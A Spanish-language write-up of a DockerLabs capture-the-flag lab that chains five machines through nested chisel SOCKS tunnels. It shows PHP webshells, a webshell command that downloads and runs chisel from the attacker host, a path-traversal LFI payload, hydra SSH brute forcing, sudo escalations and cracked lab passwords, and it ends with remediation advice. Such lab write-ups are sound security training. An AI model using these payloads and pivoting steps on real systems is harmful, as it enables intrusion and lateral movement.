# BigPivoting — Writeup (DockerLabs)

> Laboratorio de **pivoting encadenado** de [DockerLabs](https://dockerlabs.es) creado por **Ch4rum**.
> Dificultad: *Avanzado* · 5 máquinas Docker en 5 segmentos de red distintos.
> Objetivo: comprometer la primera máquina expuesta y **pivotar salto a salto** hasta rootear la máquina final, inalcanzable directamente desde el atacante.

---

## 📑 Índice

1. [Arquitectura del laboratorio](#-arquitectura-del-laboratorio)
2. [Despliegue](#-despliegue)
3. [Resumen de la cadena de compromiso](#-resumen-de-la-cadena-de-compromiso)
4. [Máquina 1 — `whereismywebshell`](#-máquina-1--whereismywebshell-1010102)
5. [Pivoting nivel 1 (chisel + proxychains)](#-pivoting-nivel-1)
6. [Máquina 2 — `upload`](#-máquina-2--upload-2020203)
7. [Pivoting nivel 2 (doble SOCKS)](#-pivoting-nivel-2)
8. [Máquina 3 — `inclusion`](#-máquina-3--inclusion-3030303)
9. [Pivoting nivel 3](#-pivoting-nivel-3)
10. [Máquina 4 — `trust`](#-máquina-4--trust-4040403)
11. [Pivoting nivel 4](#-pivoting-nivel-4)
12. [Máquina 5 — `move`](#-máquina-5--move-5050503-objetivo-final)
13. [Credenciales recopiladas](#-credenciales-recopiladas)
14. [Remediación](#-remediación)

---

## 🗺️ Arquitectura del laboratorio

Cada máquina vive en su propia subred y hace de **puente** hacia la siguiente. El atacante (Kali) solo tiene visibilidad de la **primera** red; el resto son redes internas (`macvlan --internal`) inalcanzables sin pivotar.

```
                 pivoting1            pivoting2            pivoting3            pivoting4            pivoting5
 ┌────────┐   10.10.10.0/24       20.20.20.0/24       30.30.30.0/24       40.40.40.0/24       50.50.50.0/24
 │  KALI  │──────┐
 └────────┘      │  ┌──────────────────┐  ┌────────┐  ┌───────────┐  ┌────────┐  ┌────────┐
                 └─▶│ whereismywebshell │──│ upload │──│ inclusion │──│ trust  │──│  move  │
                    │  .2         .2 ───┼──┼─ .3  .2┼──┼─ .3   .2 ─┼──┼ .3  .2 ┼──┼─ .3    │
                    └──────────────────┘  └────────┘  └───────────┘  └────────┘  └────────┘
                       www-data              root         root          root         ROOT 🏁
```

| # | Máquina             | pivoting1 | pivoting2 | pivoting3 | pivoting4 | pivoting5 | Vector inicial            | Escalada a root                    |
|---|---------------------|-----------|-----------|-----------|-----------|-----------|---------------------------|------------------------------------|
| 1 | `whereismywebshell` | 10.10.10.2| 20.20.20.2| —         | —         | —         | Webshell PHP oculta       | *(pivote de entrada, www-data)*    |
| 2 | `upload`            | —         | 20.20.20.3| 30.30.30.2| —         | —         | Subida arbitraria de PHP  | `sudo env` (GTFOBins)              |
| 3 | `inclusion`         | —         | —         | 30.30.30.3| 40.40.40.2| —         | LFI + fuerza bruta SSH    | `su seller` → `sudo php`           |
| 4 | `trust`             | —         | —         | —         | 40.40.40.3| 50.50.50.2| Fuerza bruta SSH (mario)  | `sudo vim` (GTFOBins)              |
| 5 | `move`              | —         | —         | —         | —         | 50.50.50.3| Credencial en `/tmp`      | script `sudo` escribible + `python3` |

---

## 🚀 Despliegue

El paquete `bigpivoting.zip` contiene 5 imágenes Docker (`.tar`) y un `auto_deploy.sh`. El script crea las redes encadenadas y conecta cada contenedor a su red y a la siguiente:

```bash
# Cargar las imágenes
for img in whereismywebshell upload inclusion trust move; do
  docker load -i $img.tar
done

# Desplegar (pivoting1 = bridge accesible; pivoting2-5 = macvlan internas)
sudo bash auto_deploy.sh whereismywebshell.tar upload.tar inclusion.tar trust.tar move.tar
```

Tras el despliegue, Kali obtiene una pata en `10.10.10.1/24` (gateway del bridge `pivoting1`) y solo alcanza a `10.10.10.2`.

```bash
ping -c1 10.10.10.2      # ✅ whereismywebshell
ping -c1 20.20.20.3      # ❌ inalcanzable — hay que pivotar
```

---

## 🔗 Resumen de la cadena de compromiso

```
KALI ──RCE──▶ whereismywebshell ──chisel#1──▶ upload ──chisel#2──▶ inclusion ──chisel#3──▶ trust ──chisel#4──▶ move
   (webshell)      (www-data)      (root:env)    (root:php)         (root:vim)      (root:python3)
```

La técnica transversal es un **túnel SOCKS anidado con `chisel`**, exponiendo un proxy nuevo en cada salto y encadenándolos con `proxychains` (`strict_chain`).

---

## 🖥️ Máquina 1 — `whereismywebshell` (10.10.10.2)

### Reconocimiento

```bash
nmap -p- --min-rate 3000 -sVC 10.10.10.2
# 22/tcp  OpenSSH 9.2p1
# 80/tcp  Apache 2.4.57 — "Academia de Inglés (Inglis Academi)"
```

### Enumeración web

Fuzzing de directorios revela un fichero interesante:

```bash
gobuster dir -u http://10.10.10.2/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
# /shell.php   (Status: 500) [Size: 0]
```

`shell.php` devuelve **500 con cuerpo vacío**: espera un parámetro. El propio nombre de la máquina (*"where is my webshell"*) y la pista en `warning.html` lo confirman:

> *"Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo..."*

Fuzzeando el nombre del parámetro (p.ej. con `ffuf` y `burp-parameter-names.txt`) se descubre `parameter`:

```php
// shell.php
<?php echo "<pre>" . shell_exec($_REQUEST['parameter']) . "</pre>"; ?>
```

### Ejecución remota de comandos

```bash
curl "http://10.10.10.2/shell.php?parameter=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ **RCE como `www-data`.** Esta máquina no tiene usuarios locales ni vías de escalada: es el **punto de entrada y primer pivote**. Comprobamos su segunda pata de red:

```bash
curl "http://10.10.10.2/shell.php?parameter=hostname+-I"
# 10.10.10.2 20.20.20.2   ← también está en pivoting2
```

---

## 🌀 Pivoting nivel 1

`whereismywebshell` está en `20.20.20.0/24`, donde vive la siguiente máquina. Montamos un **SOCKS inverso con chisel**:

```bash
# --- En Kali ---
# 1) Servir chisel y levantar el servidor chisel
python3 -m http.server 8000 --bind 10.10.10.1 &
./chisel server -p 9999 --reverse &

# 2) Subir chisel a la víctima y lanzar el cliente reverse (vía la webshell)
curl "http://10.10.10.2/shell.php" --data-urlencode \
  'parameter=wget -q http://10.10.10.1:8000/chisel -O /tmp/.c && chmod +x /tmp/.c && setsid /tmp/.c client 10.10.10.1:9999 R:socks &'
```

Resultado: **SOCKS5 en `127.0.0.1:1080`** que sale por `whereismywebshell`.

```ini
# /tmp/pc.conf
strict_chain
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains4 -f /tmp/pc.conf curl http://20.20.20.3/    # ✅ alcanzamos la máquina 2
```

---

## 🖥️ Máquina 2 — `upload` (20.20.20.3)

### Enumeración (a través del pivote)

Puerto 80 con un formulario de subida de ficheros → `upload.php`:

```php
$targetDirectory = "uploads/";
$targetFile = $targetDirectory . basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile);   // ❌ sin validación de extensión
```

### Subida arbitraria → RCE

```bash
echo '<?php system($_REQUEST["c"]); ?>' > sh.php
proxychains4 -f /tmp/pc.conf curl -F "file=@sh.php" -F "submit=Upload File" http://20.20.20.3/upload.php
# "The file sh.php has been uploaded."

proxychains4 -f /tmp/pc.conf curl "http://20.20.20.3/uploads/sh.php?c=id"
# uid=33(www-data)
```

### Escalada de privilegios → root

```bash
sudo -l
#   (root) NOPASSWD: /usr/bin/env
```

[GTFOBins — `env`](https://gtfobins.github.io/gtfobins/env/#sudo):

```bash
sudo /usr/bin/env /bin/sh -c id
# uid=0(root) gid=0(root) groups=0(root)     🏆 ROOT en `upload`
```

`upload` está en `30.30.30.0/24` (segunda pata) → puente a la máquina 3.

---

## 🌀 Pivoting nivel 2

Encadenamos un **segundo SOCKS**. `upload` (sin salida a Internet) descarga chisel desde la máquina 1, que actúa de *relay*:

```bash
# En la máquina 1 (whereismywebshell): servidor chisel-relay para la red pivoting2
setsid /tmp/.c server -p 9998 --reverse &

# En la máquina 2 (upload): descargar chisel (scp desde Kali por el pivote) y conectar al relay
#   R:1081:socks  →  abre un SOCKS en el localhost de la máquina 1 hacia 30.30.30.0/24
setsid /tmp/.c client 20.20.20.2:9998 R:1081:socks &
```

Como el listener `1081` vive en el *localhost de la máquina 1*, lo alcanzamos **a través del primer proxy**. `proxychains` encadena ambos:

```ini
# /tmp/pc2.conf
strict_chain
[ProxyList]
socks5 127.0.0.1 1080   # Kali → whereismywebshell
socks5 127.0.0.1 1081   # (en whereismywebshell) → upload → red 30.30.30.0/24
```

```bash
proxychains4 -f /tmp/pc2.conf curl http://30.30.30.3/   # ✅ máquina 3
```

---

## 🖥️ Máquina 3 — `inclusion` (30.30.30.3)

### Local File Inclusion

`/shop/index.php` filtra de forma insegura el parámetro `archivo`:

```php
if (isset($_GET['archivo']) && strpos($_GET['archivo'], '../') !== false) {
    $ruta_base = $_GET['archivo'];
    if (is_readable($ruta_base) && strpos($ruta_base, '../') === 0) {   // debe empezar por ../
        echo "<pre>" . file_get_contents($ruta_base) . "</pre>";
    }
}
```

El payload debe **empezar por `../`**. Es una primitiva de **lectura de ficheros**:

```bash
proxychains4 -f /tmp/pc2.conf curl -G http://30.30.30.3/shop/index.php \
  --data-urlencode 'archivo=../../../../../../etc/passwd'
# ...
# seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
# manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash
```

### De la enumeración al shell

El LFI solo lee ficheros accesibles por `www-data` (no `/etc/shadow`), pero nos da los **usuarios**. `sshd` restringe el acceso:

```
AllowUsers manchi
```

Solo `manchi` puede entrar por SSH → **fuerza bruta** de contraseñas débiles:

```bash
proxychains4 -f /tmp/pc2.conf hydra -l manchi -P rockyou.txt ssh://30.30.30.3
# [22][ssh] login: manchi   password: lovely
```

### manchi → seller → root

`seller` puede ejecutar `php` como root, pero SSH lo bloquea; saltamos con `su` (su contraseña, `qwerty`, es igualmente trivial):

```bash
proxychains4 -f /tmp/pc2.conf ssh manchi@30.30.30.3      # manchi:lovely
manchi$ su seller                                        # seller:qwerty
seller$ sudo -l
#   (ALL) NOPASSWD: /usr/bin/php
```

[GTFOBins — `php`](https://gtfobins.github.io/gtfobins/php/#sudo):

```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
# id → uid=0(root)     🏆 ROOT en `inclusion`
```

> 💡 En este laboratorio las contraseñas son entradas comunes de `rockyou` (`qwerty`, `lovely`), por lo que también se recuperan crackeando los hashes `yescrypt` de `/etc/shadow` una vez con acceso.

`inclusion` está en `40.40.40.0/24` → puente a la máquina 4.

---

## 🌀 Pivoting nivel 3

Mismo patrón, tercer SOCKS. La máquina 2 (`upload`) hace de *relay* para la red `pivoting4`:

```bash
# En upload: relay
setsid /tmp/.c server -p 9997 --reverse &
# En inclusion (transferimos chisel por scp sobre el doble pivote):
setsid /tmp/.c client 30.30.30.2:9997 R:1082:socks &
```

```ini
# /tmp/pc3.conf
strict_chain
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082   # → inclusion → red 40.40.40.0/24
```

---

## 🖥️ Máquina 4 — `trust` (40.40.40.3)

### Acceso

Web estática (`secret.php` = *"Hola Mario, esta web no se puede hackear"*) — el nombre de usuario es la pista: **mario**. Fuerza bruta SSH:

```bash
proxychains4 -f /tmp/pc3.conf hydra -l mario -P rockyou.txt ssh://40.40.40.3
# [22][ssh] login: mario   password: chocolate
```

### Escalada → root

```bash
proxychains4 -f /tmp/pc3.conf ssh mario@40.40.40.3       # mario:chocolate
mario$ sudo -l
#   (ALL) /usr/bin/vim
```

[GTFOBins — `vim`](https://gtfobins.github.io/gtfobins/vim/#sudo):

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
# id → uid=0(root)     🏆 ROOT en `trust`
```

`trust` está en `50.50.50.0/24` → puente a la máquina final.

---

## 🌀 Pivoting nivel 4

Cuarto y último SOCKS; `inclusion` hace de *relay* para `pivoting5`:

```bash
# En inclusion: relay
setsid /tmp/.c server -p 9996 --reverse &
# En trust:
setsid /tmp/.c client 40.40.40.2:9996 R:1083:socks &
```

```ini
# /tmp/pc4.conf
strict_chain
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
socks5 127.0.0.1 1082
socks5 127.0.0.1 1083   # → trust → red 50.50.50.0/24
```

```bash
proxychains4 -f /tmp/pc4.conf curl http://50.50.50.3/    # ✅ máquina final
```

---

## 🖥️ Máquina 5 — `move` (50.50.50.3) · 🏁 OBJETIVO FINAL

### Acceso

Usuario **freddy**. Su contraseña (`t9sH76gpQ82UFeZ3GXZS`, cadena aleatoria — **no crackeable** con diccionario) se recupera durante la enumeración: queda expuesta en un fichero legible por todos, y también hay `vsftpd` con `anonymous_enable=YES`.

```bash
# .../tmp/pass.txt → t9sH76gpQ82UFeZ3GXZS
proxychains4 -f /tmp/pc4.conf ssh freddy@50.50.50.3      # freddy:t9sH76gpQ82UFeZ3GXZS
```

### Escalada → root

```bash
freddy$ sudo -l
#   (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py

freddy$ ls -l /opt/maintenance.py
#   -rw-r--r-- 1 freddy freddy 35 ... /opt/maintenance.py   ← ¡lo posee freddy, es escribible!
```

El script que corre como root es **modificable por el propio freddy**. Lo reescribimos y lo ejecutamos vía `sudo`:

```bash
freddy$ echo 'import os; os.system("/bin/bash")' > /opt/maintenance.py
freddy$ sudo /usr/bin/python3 /opt/maintenance.py
# id → uid=0(root) gid=0(root) groups=0(root)
```

```
🏆🏆🏆  ROOT en `move` — laboratorio BigPivoting completado  🏆🏆🏆
```

---

## 🔑 Credenciales recopiladas

| Máquina             | Usuario | Contraseña               | Origen                                    |
|---------------------|---------|--------------------------|-------------------------------------------|
| `whereismywebshell` | www-data| —                        | RCE vía webshell (`shell.php?parameter=`) |
| `inclusion`         | manchi  | `lovely`                 | Fuerza bruta SSH / `yescrypt`             |
| `inclusion`         | seller  | `qwerty`                 | Fuerza bruta `su` / `yescrypt`            |
| `trust`             | mario   | `chocolate`              | Fuerza bruta SSH / `yescrypt`             |
| `move`              | freddy  | `t9sH76gpQ82UFeZ3GXZS`   | Fichero expuesto (`/tmp/pass.txt`, FTP)   |

---

## 🛡️ Remediación

**Aplicación web**
- `whereismywebshell`: eliminar la webshell; nunca pasar entrada de usuario a `shell_exec`/`system`.
- `upload`: validar extensión y tipo MIME, renombrar ficheros, almacenar fuera del *webroot* y servir sin permiso de ejecución (`php_admin_flag engine off` en `uploads/`).
- `inclusion`: no construir rutas con entrada del usuario; usar listas blancas y `basename()`. `file_get_contents` sobre input controlado por el atacante es LFI.

**Sistema / privilegios**
- Reglas `sudo` peligrosas: `env`, `php`, `vim`, `python3` sobre un script escribible son escaladas triviales (ver [GTFOBins](https://gtfobins.github.io)). Restringir a binarios/argumentos concretos y no editables por el usuario.
- `move`: un script ejecutado por `sudo` **jamás** debe pertenecer al usuario que lo invoca (permiso de escritura = root instantáneo). Debe ser `root:root` y `644`.
- Contraseñas: prohibir entradas de diccionario (`rockyou`) y no dejar secretos en `/tmp` ni en FTP anónimo.

**Segmentación / red**
- El diseño encadenado es correcto, pero cada host comprometido permitió pivotar por tener herramientas de red y salida hacia el segmento contiguo. Aplicar egress filtering, EDR y detección de túneles (chisel/websocket) reduce drásticamente el movimiento lateral.

---

### 🧰 Arsenal utilizado

`nmap` · `gobuster` / `ffuf` · `curl` · `chisel` (SOCKS inverso) · `proxychains4` (cadenas `strict_chain`) · `hydra` · `john`/`hashcat` · [GTFOBins](https://gtfobins.github.io)

> ⚠️ *Realizado en un entorno de laboratorio propio y controlado (DockerLabs) con fines educativos.*
